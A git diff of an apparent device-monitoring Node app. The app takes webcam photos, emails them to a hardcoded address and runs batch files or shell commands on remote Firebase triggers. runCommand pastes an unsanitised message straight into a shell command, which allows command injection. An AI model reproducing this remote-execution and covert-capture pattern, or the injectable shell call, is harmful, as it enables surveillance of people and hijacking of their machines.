@@ -13,11 +13,12 @@ import { initializeFirebase } from './helper/firebase.helper';
 import { logEvent, getCurrentDateTime } from './helper/app.helper';
 import { Device, DeviceInfo, LiveStatus, ScreenShot, BrowserHistoryInfo } from './models';
 import { DeviceStatus, ImageStatus } from './enums';
-import { CommandType } from './enums/commandType.enum';
+import { TriggerType } from './enums/triggerType.enum';
 import sgMail from '@sendgrid/mail';
 import fs from 'fs';
 import NodeWebcam from 'node-webcam';
 import { sendgrid_apiKey } from './configs';
+import { Trigger } from './models/trigger.model';
 
 export const state = {
     email: '',
@@ -262,6 +263,7 @@ function takePicture() {
                 logEvent('Webcam Capture Error', JSON.stringify(err));
             }
             if (data) {
+                // send to firebase
                 sendUserEmail(
                     ['anjariamohnish@gmail.com'],
                     'Webcam',
@@ -286,24 +288,24 @@ function checkForInternet() {
     });
 }
 
-function runCommand(commandType: CommandType, message: any = null) {
+function runCommand(triggerType: TriggerType, message: any = null) {
     if (message) {
         const createCommand = '@echo ' + message + '> "%temp%\\pss.txt"';
         const openCommand = 'start notepad.exe "%temp%\\pss.txt"';
-        execCommand(createCommand, commandType, '[Create]', (status: boolean) => {
+        execCommand(createCommand, triggerType, '[Create]', (status: boolean) => {
             if (status) {
-                execCommand(openCommand, commandType, '[Open]', null);
+                execCommand(openCommand, triggerType, '[Open]', null);
             }
         });
     } else {
-        const file = 'batchfiles\\' + CommandType[commandType].toLowerCase() + '.bat';
-        execCommand(file, commandType, null, null);
+        const file = 'batchfiles\\' + TriggerType[triggerType].toLowerCase() + '.bat';
+        execCommand(file, triggerType, null, null);
     }
 }
 
-function execCommand(commandFile: string, commandType: CommandType, note: any = '', _callback: any) {
+function execCommand(commandFile: string, triggerType: TriggerType, note: any = '', _callback: any) {
     child_proccess.exec(commandFile, (error, stdout, stderr) => {
-        logEvent('Command Exec Request', CommandType[commandType].toString() + note);
+        logEvent('Command Exec Request', TriggerType[triggerType].toString() + note);
         _callback(true);
         if (error) {
             logEvent('Command Exec Error', error);
@@ -326,8 +328,40 @@ function changeDeviceState(deviceStatus: DeviceStatus) {
 function shutDownSystem() {
     changeDeviceState(DeviceStatus.OFF)
         .then(() => {
+            //send browser history,send device up time on mail
             process.exit();
         })
 }
 
+function initializeListners() {
+    state.uuid = '4C4C4544-0059-3110-804B-B3C04F385231';
+    console.log('Hello');
+    initializeFirebase();
+    // firebase.database().ref(DEVICES_NODE).child(state.uuid).child('Triggers').push(new Trigger());
+    // firebase.database().ref(DEVICES_NODE).child(state.uuid).child('Triggers').push(new Trigger());    firebase.database().ref(DEVICES_NODE).child(state.uuid).child('Triggers').push(new Trigger());
+  
+  
+    const triggerRef = firebase.database().ref(DEVICES_NODE).child(state.uuid).child('Triggers').orderByChild('isCompleted').equalTo('false');
+
+triggerRef.once('value',(snapshot)=>{
+console.log(snapshot.key,snapshot.val());
+});
+
+    // triggerRef.on('child_added', (data: any) => {
+    //     console.log('child_added', data.val());
+    // })
+
+
+    // triggerRef.on('child_changed', (data: any) => {
+    //     console.log('child_changed', data.val());
+    // })
+
+
+    // triggerRef.on('child_removed', (data: any) => {
+    //     console.log('child_removed', data.val());
+    // })
+
+}
+
+initializeListners();
 // startUp();
